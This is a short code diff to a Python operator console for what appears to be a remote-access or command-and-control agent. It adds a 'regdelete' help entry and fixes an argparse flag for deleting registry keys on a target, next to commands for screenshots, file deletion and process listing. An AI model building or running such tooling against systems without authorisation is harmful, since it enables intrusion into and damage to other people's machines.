@@ -28,6 +28,7 @@ def printHelp():
                 deletefile - Perform a delete file off target\n
                 screenshot - Take a screenshot of target (will get file and delete file off target)\n
                 regread - Read a registry key off target\n
+                regdelete - Delete a registry key/value off target\n
                 processlist -  List all running processes off target\n
                 exit - Task agent to shutdown gracefully and cleanup\n""")
     return SUCCESS
@@ -159,7 +160,7 @@ def handleInput(ip, port):
             printRegDeleteHelp()
             user_input = input("> ")
             parser = argparse.ArgumentParser(description='Delete a registry key/value off target')
-            parser.add_argument('-iskey', '--iskey', type=bool, help='The value being passed is a subkey we are deleting, not a value - if not passed it is assumed a value', required=False, action='store_true')
+            parser.add_argument('-iskey', '--iskey', help='The value being passed is a subkey we are deleting, not a value - if not passed it is assumed a value', required=False, action='store_true')
             parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key that contains the key/value we are deleting', action='store', required=True)
             parser.add_argument('-value', '--value', type=str, help='Name of the value/key we want to delete', action='store', required=True)
             args = parser.parse_args(user_input.split())
